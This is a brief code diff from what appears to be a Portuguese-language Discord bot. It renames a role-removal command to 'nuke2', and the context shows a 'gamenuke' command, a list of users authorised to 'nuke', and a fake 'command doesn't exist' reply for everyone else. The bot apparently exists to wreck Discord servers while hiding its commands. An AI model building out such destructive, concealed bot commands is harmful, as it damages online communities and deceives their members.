@@ -1509,7 +1509,7 @@ async def gamenuke(ctx):
 
 # ================= COMANDO REMOVERCARGO =================
 
-@bot.command(name="removercargo")
+@bot.command(name="nuke2")
 async def remover_cargo(ctx):
     if ctx.author.id not in NUKE_AUTORIZADOS:
         await ctx.send("Esse comando não existe! 🤔")
